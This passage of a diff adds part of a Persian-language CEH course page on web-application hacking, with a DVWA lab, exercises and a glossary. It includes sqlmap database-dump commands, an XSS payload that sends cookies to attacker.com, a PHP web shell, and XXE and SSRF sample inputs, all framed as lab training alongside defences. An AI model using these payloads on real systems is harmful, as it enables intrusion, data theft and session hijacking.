+            <li><b>XSS:</b> Output Encoding, Content Security Policy (CSP), HttpOnly Cookies.</li>
+            <li><b>CSRF:</b> CSRF Tokens, SameSite Cookies, Referer Validation.</li>
+            <li><b>File Upload:</b> بررسی نوع فایل، محدود کردن پسوندها، ذخیره خارج از ریشه وب.</li>
+            <li><b>IDOR:</b> بررسی مجوز دسترسی، استفاده از UUID.</li>
+            <li><b>Command Injection:</b> استفاده از توابع ایمن، فیلتر کردن ورودی‌ها.</li>
+            <li><b>XXE:</b> غیرفعال کردن External Entities.</li>
+            <li><b>SSRF:</b> فیلتر کردن URLها، محدود کردن دامنه‌های مجاز.</li>
+        </ul>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> بهترین دفاع در برابر حملات برنامه‌های وب، ترکیبی از کدنویسی امن، پیکربندی صحیح و استفاده از ابزارهای امنیتی است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۶: کارگاه عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="lab-exercise">
+        <h2>🧪 کارگاه عملی – هک برنامه‌های وب</h2>
+        <p>
+            در این کارگاه، شما با تکنیک‌ها و ابزارهای هک برنامه‌های وب آشنا خواهید شد و یک سناریوی کامل از نفوذ به یک برنامه وب آسیب‌پذیر را در محیط آزمایشگاهی پیاده‌سازی می‌کنید.
+        </p>
+
+        <h3>🎯 هدف کارگاه:</h3>
+        <ul>
+            <li>آشنایی با ابزارهای Burp Suite و SQLmap.</li>
+            <li>اجرای SQL Injection روی یک برنامه آسیب‌پذیر.</li>
+            <li>اجرای XSS روی یک برنامه آسیب‌پذیر.</li>
+            <li>اجرای CSRF و Session Hijacking.</li>
+            <li>مقابله با حملات.</li>
+        </ul>
+
+        <h3>🖥️ محیط مورد نیاز:</h3>
+        <ul>
+            <li><b>حمله‌کننده:</b> Kali Linux</li>
+            <li><b>هدف:</b> DVWA (Damn Vulnerable Web Application) یا Metasploitable 2</li>
+            <li><b>ابزارها:</b> Burp Suite, SQLmap, Firefox Developer Tools</li>
+        </ul>
+
+        <h3>📝 سناریوی گام‌به‌گام:</h3>
+
+        <h4>مرحله ۱: راه‌اندازی محیط آزمایشگاهی</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># روی Metasploitable 2
+sudo service apache2 start
+
+# دسترسی به DVWA: http://192.168.1.101/dvwa/
+# ورود: admin / password</code></pre>
+        </div>
+
+        <h4>مرحله ۲: SQL Injection با SQLmap</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن SQL Injection در صفحه کاربر
+sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=..."
+
+# استخراج پایگاه‌های داده
+sqlmap -u "..." --dbs
+
+# استخراج جداول
+sqlmap -u "..." -D dvwa --tables
+
+# استخراج داده‌ها
+sqlmap -u "..." -D dvwa -T users --dump</code></pre>
+        </div>
+
+        <h4>مرحله ۳: XSS در DVWA</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># در صفحه XSS (Reflected) ورودی زیر را امتحان کنید:
+&lt;script&gt;alert('Hacked!')&lt;/script&gt;
+
+# یا سرقت کوکی:
+&lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code></pre>
+        </div>
+
+        <h4>مرحله ۴: CSRF در DVWA</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># در صفحه تغییر رمز عبور، یک درخواست CSRF ایجاد کنید
+# از Burp Suite برای ثبت و تغییر درخواست استفاده کنید</code></pre>
+        </div>
+
+        <h4>مرحله ۵: File Upload (آپلود Web Shell)</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># ایجاد یک Web Shell PHP
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# آپلود فایل در صفحه File Upload
+# سپس دسترسی به: http://192.168.1.101/dvwa/hackable/uploads/shell.php?cmd=id</code></pre>
+        </div>
+
+        <h4>مرحله ۶: مقابله با حملات</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># تنظیمات امنیتی در کد برنامه
+# 1. استفاده از Prepared Statements برای SQL
+# 2. فیلتر کردن ورودی‌ها برای XSS
+# 3. CSRF Tokens
+# 4. بررسی نوع فایل برای آپلود</code></pre>
+        </div>
+
+        <div class="highlight-box">
+            <b>⏳ تکلیف:</b> تمام مراحل بالا را در محیط آزمایشگاهی خود اجرا کنید و یک گزارش کامل از فرآیند هک برنامه وب، تشخیص و مقابله تهیه کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۷: تمرین‌های عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="practice-exercises">
+        <h2>📝 تمرین‌های عملی</h2>
+        <p>
+            این تمرینات به شما کمک می‌کنند تا مهارت‌های خود در زمینه هک برنامه‌های وب را تقویت کنید.
+        </p>
+
+        <ul>
+            <li>
+                <b>تمرین ۱ – SQL Injection:</b>
+                <br>روی DVWA، SQL Injection را در سطح امنیتی Low انجام دهید و داده‌های پایگاه داده را استخراج کنید.
+            </li>
+            <li>
+                <b>تمرین ۲ – XSS:</b>
+                <br>روی DVWA، یک حمله Reflected XSS و Stored XSS را پیاده‌سازی کنید.
+            </li>
+            <li>
+                <b>تمرین ۳ – CSRF:</b>
+                <br>روی DVWA، یک حمله CSRF برای تغییر رمز عبور کاربر طراحی کنید.
+            </li>
+            <li>
+                <b>تمرین ۴ – File Upload:</b>
+                <br>روی DVWA، یک Web Shell آپلود کنید و از آن برای اجرای دستورات استفاده کنید.
+            </li>
+            <li>
+                <b>تمرین ۵ – Burp Suite:</b>
+                <br>با استفاده از Burp Suite، یک حمله SQL Injection را در DVWA انجام دهید.
+            </li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۸: واژه‌نامه تخصصی -->
+    <!-- ============================================================ -->
+    <div class="card" id="glossary">
+        <h2>📖 واژه‌نامه تخصصی (Glossary)</h2>
+        <p>
+            در این بخش، تمام واژه‌های تخصصی این ماژول، همراه با <b>ساختار (ریشه یا مخفف)، تعریف ساده، کاربرد در هک، و یک مثال روزمره</b> توضیح داده شده است.
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr>
+                    <th style="min-width:130px;">واژه</th>
+                    <th style="min-width:100px;">ساختار / مخفف</th>
+                    <th>تعریف ساده</th>
+                    <th>کاربرد در هک</th>
+                    <th>مثال</th>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">SQL Injection</span></td>
+                    <td>SQLi</td>
+                    <td>تزریق کد SQL به ورودی‌های برنامه.</td>
+                    <td>دسترسی به پایگاه داده.</td>
+                    <td><code dir='ltr'>' OR '1'='1</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">XSS</span></td>
+                    <td><b>C</b>ross-<b>S</b>ite <b>S</b>cripting</td>
+                    <td>تزریق کد جاوااسکریپت به صفحات وب.</td>
+                    <td>سرقت کوکی، تغییر صفحه.</td>
+                    <td><code dir='ltr'>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">CSRF</span></td>
+                    <td><b>C</b>ross-<b>S</b>ite <b>R</b>equest <b>F</b>orgery</td>
+                    <td>ارسال درخواست ناخواسته از طرف کاربر.</td>
+                    <td>تغییر رمز، انتقال وجه.</td>
+                    <td>فرم مخفی با اقدامات حساس.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">IDOR</span></td>
+                    <td><b>I</b>nsecure <b>D</b>irect <b>O</b>bject <b>R</b>eference</td>
+                    <td>دسترسی مستقیم به اشیاء بدون بررسی مجوز.</td>
+                    <td>دسترسی به اطلاعات کاربران دیگر.</td>
+                    <td><code dir='ltr'>profile?id=124</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Command Injection</span></td>
+                    <td>—</td>
+                    <td>اجرای دستورات سیستمی از طریق ورودی.</td>
+                    <td>کنترل کامل سرور.</td>
+                    <td><code dir='ltr'>?cmd=id</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">XXE</span></td>
+                    <td><b>X</b>ML <b>E</b>xternal <b>E</b>ntity</td>
+                    <td>تزریق موجودیت‌های خارجی به XML.</td>
+                    <td>خواندن فایل‌های سیستمی.</td>
+                    <td><code dir='ltr'>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">SSRF</span></td>
+                    <td><b>S</b>erver-<b>S</b>ide <b>R</b>equest <b>F</b>orgery</td>
+                    <td>ارسال درخواست از سمت سرور به آدرس‌های دلخواه.</td>
+                    <td>دسترسی به سرورهای داخلی.</td>
+                    <td><code dir='ltr'>?url=http://169.254.169.254/</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Web Shell</span></td>
+                    <td>—</td>
+                    <td>فایل مخرب برای اجرای دستورات روی سرور.</td>
+                    <td>کنترل سرور از طریق مرورگر.</td>
+                    <td><code dir='ltr'>&lt;?php system($_GET['cmd']); ?&gt;</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">WAF</span></td>
+                    <td><b>W</b>eb <b>A</b>pplication <b>F</b>irewall</td>
+                    <td>فایروال برنامه‌های وب.</td>
+                    <td>محافظت در برابر حملات.</td>
+                    <td>Cloudflare WAF.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Burp Suite</span></td>
+                    <td>—</td>
+                    <td>ابزار تست نفوذ وب.</td>
+                    <td>دستکاری درخواست‌ها، اسکن آسیب‌پذیری.</td>
+                    <td>Proxy, Intruder, Repeater.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">SQLmap</span></td>
+                    <td>—</td>
+                    <td>ابزار خودکار SQL Injection.</td>
+                    <td>تشخیص و بهره‌برداری SQLi.</td>
+                    <td><code dir='ltr'>sqlmap -u "http://..." --dbs</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">DVWA</span></td>
+                    <td><b>D</b>amn <b>V</b>ulnerable <b>W</b>eb <b>A</b>pplication</td>
+                    <td>برنامه وب آسیب‌پذیر برای تمرین.</td>
+                    <td>محیط آزمایشگاهی برای هک.</td>
+                    <td>http://192.168.1.101/dvwa/</td>
+                </tr>
+
+            </table>
+        </div>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> این واژه‌نامه یک مرجع کامل و سریع برای تمام مفاهیم کلیدی ماژول ۱۴ است. توصیه می‌شود آن را بارها مرور کنید تا اصطلاحات برای شما جا بیفتد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- جمع‌بندی نهایی -->
+    <!-- ============================================================ -->
+    <div class="highlight-box">
+        <b>💡 جمع‌بندی ماژول ۱۴:</b>
+        <p>
+            در این ماژول با یکی از مهم‌ترین حوزه‌های امنیت سایبری، یعنی <b>هک برنامه‌های وب</b> آشنا شدید:
+        </p>
+        <ul>
+            <li><b>معماری برنامه‌های وب</b> و اجزای آن.</li>
+            <li><b>OWASP Top 10</b> و ۱۰ آسیب‌پذیری برتر.</li>
+            <li><b>حملات اصلی:</b> SQL Injection, XSS, CSRF, Session Hijacking, File Upload, IDOR, Command Injection, XXE, SSRF.</li>
+            <li><b>ابزارهای کلیدی:</b> Burp Suite, SQLmap, OWASP ZAP, Nikto, Gobuster.</li>
+            <li><b>نقش هوش مصنوعی</b> در هک برنامه‌های وب.</li>
+            <li><b>راه‌های مقابله</b> با هر نوع حمله.</li>
+        </ul>
+        <p>
+            <b>📌 گام بعدی:</b> در <a href="../Module_15_SQL_Injection/index.html" style="color:#2a7de1;font-weight:bold;">ماژول ۱۵ – SQL Injection</a> به طور تخصصی با تزریق SQL و تکنیک‌های پیشرفته آن آشنا خواهید شد.
+        </p>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">ماژول ۱۴ – Hacking Web Applications | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
